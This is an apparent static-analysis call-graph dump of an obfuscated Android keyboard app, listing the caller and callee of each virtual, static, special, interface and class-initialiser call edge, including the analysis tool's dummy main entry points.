VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.lang.Object: int hashCode()>
STATIC edge: $r0 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>("%s (%s) must not be negative", $r1) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
STATIC edge: $r0 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s h(j$.util.concurrent.s,j$.util.concurrent.s)>($r0, $r3) in <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s h(j$.util.concurrent.s,j$.util.concurrent.s)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.lang.Object[] y()>() in <ljd: java.lang.Object k(int)> ==> <ljd: java.lang.Object[] y()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkh: int c()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: int c()>
STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljf: java.util.Set g()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.util.Set g()>
VIRTUAL edge: $i0 = virtualinvoke $r7.<lsm: int a(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: int a(lsz)>
STATIC edge: $r1 = staticinvoke <izw: java.lang.Object al(int)>($i1) in <ljd: int b()> ==> <izw: java.lang.Object al(int)>
SPECIAL edge: specialinvoke $r0.<java.lang.StringBuilder: void <init>()>() in <izw: java.lang.Object al(int)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: virtualinvoke r0.<ljd: void t(int)>($i6) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: void t(int)>
INTERFACE edge: interfaceinvoke $r5.<java.util.Collection: boolean add(java.lang.Object)>($r2) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <ljf: boolean add(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lmo: int a(java.lang.Object,java.lang.Object)>($r3, $r8) in <lqs: boolean equals(java.lang.Object)> ==> <lmo: int a(java.lang.Object,java.lang.Object)>
STATIC edge: $i3 = staticinvoke <izw: int aj(java.lang.Object,int)>($r2, $i2) in <ljd: int f(java.lang.Object)> ==> <izw: int aj(java.lang.Object,int)>
STATIC edge: $i9 = staticinvoke <izw: int af(int,int)>($i2, $i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int af(int,int)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <ljd: java.lang.Object j()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Boolean: java.lang.Boolean valueOf(boolean)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r2.<java.util.NoSuchElementException: void <init>()>() in <lsb: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
VIRTUAL edge: $i8 = virtualinvoke $r13.<lvq: int size()>() in <lvr: void <init>(lvr,lvr)> ==> <lvq: int size()>
SPECIAL edge: specialinvoke $r15.<lme: void <init>(lkx,int)>($r12, $i0) in <lmb: lme f()> ==> <lme: void <init>(lkx,int)>
VIRTUAL edge: virtualinvoke $r7.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <nzh: boolean f(ivv)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Exception: void <init>()>() in <java.lang.RuntimeException: void <init>()> ==> <java.lang.Exception: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljf: java.util.Set f()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.util.Set f()>
SPECIAL edge: specialinvoke $r5.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_SEARCH_METADATA", 5, 5) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
INTERFACE edge: $i0 = interfaceinvoke $r0.<java.util.List: int size()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lql: int size()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<lkq: int size()>() in <lkm: void <init>(lkq,int)> ==> <lqp: int size()>
STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $z2 = staticinvoke <lvm: boolean i(char)>($c1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <lvm: boolean i(char)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r2, $i7, $r10) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
VIRTUAL edge: $r4 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<lkq: void <init>()>() in <lql: void <init>(java.lang.Object[],int)> ==> <lkq: void <init>()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <lqp: java.lang.Object get(int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(9) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
STATIC edge: $r0 = staticinvoke <j$.sun.misc.b: j$.sun.misc.b h()>() in <j$.util.concurrent.r: void <clinit>()> ==> <j$.sun.misc.b: j$.sun.misc.b h()>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $i6 = staticinvoke <izw: int af(int,int)>($i3, $i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int af(int,int)>
SPECIAL edge: specialinvoke $r9.<mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>($r2, $r3, $r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.util.WeakHashMap: void <init>()>() in <gwk: void <init>()> ==> <java.util.WeakHashMap: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljd: int f(java.lang.Object)>($r2) in <ljb: void a()> ==> <ljd: int f(java.lang.Object)>
CLINIT edge: staticinvoke <lvr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lvr: void <clinit>()>
SPECIAL edge: specialinvoke $r2.<lmc: void <init>(lme)>(r0) in <lme: lma c()> ==> <lmc: void <init>(lme)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.util.Map n(int)>($i0) in <ljd: java.util.Map m()> ==> <ljd: java.util.Map n(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljd: int c()>() in <liz: void <init>(ljd)> ==> <ljd: int c()>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: int highestOneBit(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lrg: int hashCode()>
SPECIAL edge: specialinvoke $r6.<lrg: void <init>(java.lang.Object)>($r1) in <lma: lma i(int,java.lang.Object[])> ==> <lrg: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke $r10.<java.lang.StringBuilder: void <init>()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lje: void <init>(ljf)>(r0) in <ljf: java.util.Iterator iterator()> ==> <lje: void <init>(ljf)>
SPECIAL edge: specialinvoke $r28.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
SPECIAL edge: $r1 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: java.lang.Object e(int)> ==> <ljf: java.lang.Object[] s()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractSet: void <init>()>() in <lvq: void <init>(lvr,int)> ==> <java.util.AbstractSet: void <init>()>
SPECIAL edge: specialinvoke $r4.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r5) in <izw: java.lang.Object al(int)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: void <init>(char[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r4.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lma: lkq f()>() in <lma: lkq k()> ==> <lqr: lkq f()>
STATIC edge: $i0 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: int n(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <j$.util.concurrent.ConcurrentHashMap: int n(int)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <liy: int size()>
STATIC edge: $r1 = staticinvoke <lkq: lkq h(java.lang.Object[],int)>($r2, $i0) in <lqr: lkq f()> ==> <lkq: lkq h(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.util.AbstractCollection: void <init>()>() in <lkh: void <init>()> ==> <java.util.AbstractCollection: void <init>()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(3) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <lma: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean deepEquals(java.lang.Object[],java.lang.Object[])>($r2, $r3) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean deepEquals(java.lang.Object[],java.lang.Object[])>
CLINIT edge: staticinvoke <lqc: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqc: void <clinit>()>
VIRTUAL edge: $r4 = virtualinvoke $r3.<java.lang.StringBuilder: java.lang.String toString()>() in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r1 = staticinvoke <j$.sun.misc.b: java.lang.reflect.Field i()>() in <j$.sun.misc.b: void <clinit>()> ==> <j$.sun.misc.b: java.lang.reflect.Field i()>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int highestOneBit(int)>($i1) in <lkg: int a(int,int)> ==> <java.lang.Integer: int highestOneBit(int)>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOfRange(java.lang.Object[],int,int,java.lang.Class)>($r2, $i0, $i1, $r3) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <java.util.Arrays: java.lang.Object[] copyOfRange(java.lang.Object[],int,int,java.lang.Class)>
STATIC edge: $r1 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <lvr: int hashCode()> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int j()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: int j()>
STATIC edge: $r4 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r4) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lkq: boolean isEmpty()>() in <lkq: lsb C(int)> ==> <java.util.AbstractCollection: boolean isEmpty()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r0) in <lri: boolean a(java.util.Comparator,java.lang.Iterable)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int j()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: int j()>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "fromLocale", 222, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsv: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke r0.<com.google.android.apps.inputmethod.latin.LatinApp: void <init>()>() in <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <init>()> ==> <com.google.android.apps.inputmethod.latin.LatinApp: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkq: java.lang.Object get(int)>($i2) in <lkq: int hashCode()> ==> <lql: java.lang.Object get(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
SPECIAL edge: $r5 = specialinvoke r0.<ljf: java.lang.Object p()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.lang.Object p()>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r8, $i2, $r4) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lkh: java.lang.Object[] n()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lkh: java.lang.Object[] n()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: int hashCode()>
CLINIT edge: staticinvoke <ql: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ql: void <clinit>()>
SPECIAL edge: specialinvoke r0.<lig: void <init>()>() in <lim: void <init>()> ==> <lig: void <init>()>
STATIC edge: $r1 = staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>("line.separator") in <lwe: void <clinit>()> ==> <java.lang.System: java.lang.String getProperty(java.lang.String)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lrg: lsa l()>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Collection: boolean isEmpty()>() in <lmb: lme f()> ==> <java.util.AbstractCollection: boolean isEmpty()>
VIRTUAL edge: $i1 = virtualinvoke $r11.<lma: int size()>() in <lmb: lme f()> ==> <lqr: int size()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: int hashCode()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" threw ") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <llg: java.lang.Object next()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <lrg: java.util.Iterator iterator()>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <ljf: int size()>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(char[],char[])>($r12, $r13) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(char[],char[])>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqr: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.c: void <init>(long)> ==> <java.lang.Object: void <init>()>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r3) in <lri: boolean V(java.util.List,java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)>($r2, $r1, 0) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: boolean equals(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <lvt: boolean equals(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <lqq: java.lang.Object s(java.lang.Object[],int,int,int)>($r1, $i0, $i1, 0) in <lqk: void <init>(java.lang.Object[],int)> ==> <lqq: java.lang.Object s(java.lang.Object[],int,int,int)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "message") in <lup: void <init>(lwc,java.lang.String)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
SPECIAL edge: $r3 = specialinvoke r0.<ljf: int[] r()>() in <ljf: int o(int,int,int,int)> ==> <ljf: int[] r()>
STATIC edge: $r7 = staticinvoke <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>("com.google.common.base.Strings") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <lkq: java.util.Iterator iterator()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object[] y()>() in <ljd: void t(int)> ==> <ljd: java.lang.Object[] y()>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <lqr: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: java.lang.Object get(int)>($i0) in <lkm: java.lang.Object a(int)> ==> <lqp: java.lang.Object get(int)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <lsb: boolean hasNext()>
SPECIAL edge: specialinvoke $r3.<hnq: void <init>()>() in <hnt: void <clinit>()> ==> <hnq: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkq: lsb C(int)>(0) in <lkq: lsb B()> ==> <lkq: lsb C(int)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<mly: java.lang.IllegalArgumentException f()>() in <lqq: java.lang.Object s(java.lang.Object[],int,int,int)> ==> <mly: java.lang.IllegalArgumentException f()>
CLINIT edge: staticinvoke <ltf: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ltf: void <clinit>()>
INTERFACE edge: $z0 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <llg: boolean hasNext()> ==> <lsb: boolean hasNext()>
SPECIAL edge: specialinvoke $r0.<lvs: void <init>(java.lang.String,int)>("BOOLEAN", 0) in <lvs: void <clinit>()> ==> <lvs: void <init>(java.lang.String,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <izw: java.lang.Object[] S(java.lang.Iterable)>($r1) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <izw: java.lang.Object[] S(java.lang.Iterable)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<ljd: java.lang.Object h(int)>($i0) in <ljb: void <init>(ljd,int)> ==> <ljd: java.lang.Object h(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <lqr: int hashCode()>
STATIC edge: staticinvoke <java.util.Arrays: void fill(byte[],byte)>($r4, -1) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.Arrays: void fill(byte[],byte)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<mly: java.lang.IllegalArgumentException f()>() in <lkt: lkx b(boolean)> ==> <mly: java.lang.IllegalArgumentException f()>
STATIC edge: staticinvoke <java.util.Arrays: void fill(int[],int)>($r8, $i1) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.Arrays: void fill(int[],int)>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <llg: java.lang.Object next()>
STATIC edge: staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lly: void j(java.lang.Object)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.Object: java.lang.Class getClass()>() in <lri: java.lang.Object[] o(java.lang.Object[],int)> ==> <java.lang.Object: java.lang.Class getClass()>
SPECIAL edge: specialinvoke r0.<lkh: void <init>()>() in <lma: void <init>()> ==> <lkh: void <init>()>
STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.reflect.Method getDeclaredMethod(java.lang.String,java.lang.Class[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("null value in entry: ") in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r0) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <iye: void O(int,int)>($i0, $i1) in <lql: java.lang.Object get(int)> ==> <iye: void O(int,int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Throwable: void <init>()>() in <java.lang.Exception: void <init>()> ==> <java.lang.Throwable: void <init>()>
INTERFACE edge: $r6 = interfaceinvoke $r1.<java.util.Iterator: java.lang.Object next()>() in <llg: java.lang.Object next()> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $r2 = virtualinvoke $r0.<androidx.core.content.FileProvider: android.os.ParcelFileDescriptor openFile(android.net.Uri,java.lang.String)>(null, "") in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: android.os.ParcelFileDescriptor openFile(android.net.Uri,java.lang.String)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lrg: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String,java.lang.Throwable)>($r1, $r10) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String,java.lang.Throwable)>
